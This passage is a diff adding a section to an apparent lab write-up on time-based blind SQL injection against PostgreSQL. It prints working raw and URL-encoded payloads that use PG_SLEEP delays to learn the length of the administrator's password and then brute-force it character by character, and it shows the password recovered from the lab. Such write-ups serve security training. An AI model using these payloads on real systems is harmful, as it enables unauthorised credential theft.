@@ -570,3 +570,39 @@ The above did not work. However, eventually I tried:
 Which incurred a 10-second delay before getting the response from the server. This also means that the underlying DB was PostgreSQL.
 
 Upon checking the lab status, it was indeed finished. So, lab complete!
+
+---
+
+## 15. Blind SQL injection with time delays and information retrieval
+
+### Description
+Similar to [14](#14-blind-sql-injection-with-time-delays), but tasked to retrieve the user `administrator`'s password on top.
+
+### Solution
+First, I checked what version of SQL the server is running. It was PostgreSQL as `PG_SLEEP(10)` is what worked.
+
+Afterwards, I did a similar query to [12](#12-blind-sql-injection-with-conditional-errors), where I made the query short-circuit into a time-delay whenever a condition I wanted was fulfilled. I first used this to check the length of the password:
+> ```sql
+> SELECT CASE WHEN LENGTH(password)>{seq} THEN '' ELSE PG_SLEEP(10) END FROM users WHERE username='administrator'
+> >>>
+> '||(SELECT+CASE+WHEN+LENGTH(password)>{seq}+THEN+''+ELSE+PG_SLEEP(10)+END+FROM+users+WHERE+username%3d'administrator')+--+
+> ```
+
+<img src="./sleep-exfil-pwd-len.png" width=400>
+
+In the query, I set it to only trigger the time delay once we've broken the condition so that I'd only have to wait 10 seconds upon sucess. As shown in the image, the password has length 20, just like the previous questions.
+
+Now, similar to [12](#12-blind-sql-injection-with-conditional-errors), I brute-forced the password using the following query:
+> ```sql
+> SELECT CASE WHEN SUBSTR(password, {seq}, 1)='{char}' THEN PG_SLEEP(10) ELSE '' END FROM users WHERE username='administrator'
+> >>>
+> '||(SELECT+CASE+WHEN+SUBSTR(password,{seq},1)%3d'{char}'+THEN+PG_SLEEP(10)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')+--+
+> ```
+
+<img src="./sleep-exfil-pwd-brute.png" width=400>
+
+Sorting by response time, we can now find the 20 characters that make up the `administrator`'s password:
+
+> `2azn1z8799x671498qh5`
+
+Now we can log in and finish the lab!
